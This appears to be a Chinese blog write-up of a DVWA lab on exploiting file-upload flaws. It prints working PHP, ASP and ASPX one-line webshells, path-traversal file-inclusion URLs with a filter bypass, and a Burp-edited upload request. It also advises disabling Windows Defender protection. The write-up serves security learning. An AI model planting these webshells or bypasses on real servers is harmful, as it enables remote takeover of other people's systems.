---
title: "AntiSword Attack"
date: 2024-06-01T08:01:13.000Z
lastmod: 2024-06-02T04:20:56.020Z
draft: false
author: "Tardfyou"
description: "易直向前"
summary: "易直向前"
slug: "AntiSword-Attack"
tags:
  - "learning"
categories:
  - "Web"
images:
  - "https://tardfyou.github.io/images/AntiSword/umishibaura_16.jpg"
lightgallery: true
---

# Web渗透文件上传漏洞-中国蚁剑
在新的实战环节中，我进行了Web漏洞在dvwa靶机上的复现，关机dava靶机的部署，可以通过docker或者phpstudyPro。
其中的教程在网上很多，需要的读者请自行检索。过程中可能发生的问题集中在MySQL数据库上，无非是本机数据库的关闭还有phpstudyPro
下数据库的配置文件修改。其中我们需要的网站文件可以在Github中找到。
本次Web渗透学习了暴力破解，命令注入，跨站请求伪造，文件包含，文件上传，SQL注入，在此仅讲述文件上传漏洞的过程。
其中，文件上传漏洞的难度限制在low和medium。

## 文件上传漏洞
File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格
的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文
件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件
上传漏洞。

## 实验内容
 + 相对路径获取。
 + test.php hack.php脚本
 + php一句话小木马
 + 中国蚁剑安装
 + 

### 路径信息获取
上传文件时，一定概率获取反馈相对路径，根据相对路径确定我们的下一步操作。
在实战当中，我们应该通过猜测的方式获取，本次实验难度低直接回显了路径。
![](/images/AntiSword/pathshow.png)

### 相对路径测试
Low级别对文件没有进行任何审计（比如病毒、木马），可直接上传，如果知道上传文件
存储的路径，则可对该文件直接运行。
比如，上传test.php文件，构造URL。
```
<?php
test.php文件 phpinfo();
?>
(win)http://地址
/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\hackable\uploads\test.php
(linux) http:// 地址:端口号/../../hackable/uploads/test.php
```
在Low和Medium级别下可得到运行结果，展示出站点的php和服务器配置信息。
![](/images/AntiSword/test.png)
在文件包含攻击中，可以运行服务器中的php文件，如果想运行自己制作的php文件，比如
test.php文件，就可以通过文件上传漏洞将这个文件上传到服务器。
当然，前提是要获得上传文件保存路径，有些服务器提供访问上传文件的访问链接或信息
反馈，从而可以猜测出上传文件保存路径，也可以事先对网站扫描获取（如owasp-zap）。
也可以通过木马获取服务器目录访问权限.

### 一句话木马（小木马）
一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为
了绕过waf（应用级入侵防御系统）的检测，一句话木马出现了无数中变形，但本质是不
变的：木马的函数执行了我们发送的命令。
我们可以通过GET 、POST 、COOKIE这三种方式向一个网站提交数据，一句话木马用
$_GET[' ']、$_POST[' ']、$_COOKIE[' '] 接收我们传递的数据，并把接收的数据传递给一句
话木马中执行命令的函数，进而执行命令。
经典一句话木马大多只有两个部分，可以执行代码的函数部分，接收数据的部分。
例如：
```
hack.php文件： <?php eval(@$_POST['a']); ?>
```
只要攻击者满足三个条件，就能实现成功入侵：
 + 木马上传成功，未被杀；
 + 知道木马的路径在哪；
 + 上传的木马能正常运行。
常见的一句话木马：
php的一句话木马： <?php @eval($_POST['pass’]); ?>
asp的一句话是： <%eval request ("pass")%>
aspx的一句话是： <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
<?php @eval($_POST['pass']); ?>（注意换行，或空格）

### 中国蚁剑安装
下载加载器：
![](/images/AntiSword/downl.png)
注意，需要下拉而不是直接在仓库code处下载。
不需要下载主体，解压加载器后直接运行，会在自定义路径下载解压，如果解压失败。
只需手动解压安装好的主体然后更换自定义路径即可。

关闭蚁剑的时候需要去任务管理器，直接退出没有用。

### 文件上传
加入失败报错，只需关闭windows安全中心放病毒中的实时监测和篡改保护（可能会删掉hack.php导致上传失败）。
![](/images/AntiSword/upload.png)

### 修改文件名
双击添加项目后进入目录结构
![](/images/AntiSword/struc.png)
同样上传hack.php，页面反馈：Your image was not uploaded. We can only accept JPEG or
PNG images.可知对文件后缀进行了限制。
尝试将test.txt改为test.png，上传成功。
使用File inclusion测试
构建URL（Low）
(win)http://IP:端口/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\hackable\uploads\test.png
(Linux)http:// IP:端口/vulnerabilities/fi/?page=../../hackable/uploads/test.png
构建URL （Medium） ，要使用双写替换
(Linux)http:// IP:端口/vulnerabilities/fi/?page=..././..././hackable/uploads/test.png
应该得到phpinfo.php如上文所述的正常反馈。

尝试将hack.php改为hack.png，上传成功。如先前步骤在蚁剑添加数据。
在上传文件时使用Brup抓包，可查看提交相关代码。
![](/images/AntiSword/burp1.png)
-----------------------------265616973130209483341813704143
Content-Disposition: form-data; name="MAX_FILE_SIZE"
100000
-----------------------------265616973130209483341813704143
Content-Disposition: form-data; name="uploaded"; filename="hack.png"
Content-Type: image/png
<?php @eval($_POST['pass’]); ?>
从页面代码可知，对文件大小和文件格式都做了限制。直接修改页面代码中的“hack.png”
为”hack.php”，点击Forward按钮提交。通过蚁剑访问可知hack.php提交到服务器。

利用方案如图
![](/images/AntiSword/liyong.png)
![](/images/AntiSword/liyong1.png)
![](/images/AntiSword/liyong2.png)
![](/images/AntiSword/liyong3.png)
![](/images/AntiSword/liyong4.png)
![](/images/AntiSword/liyong5.png)

### 文件上传漏洞站点代码（low级别）
如图：
![](/images/AntiSword/lowp.png)

## 总结
本次文件上传实验掌握了一句话木马，相对路径获取，文件形式绕过检测，burp抓包上传，中国蚁剑的使用。
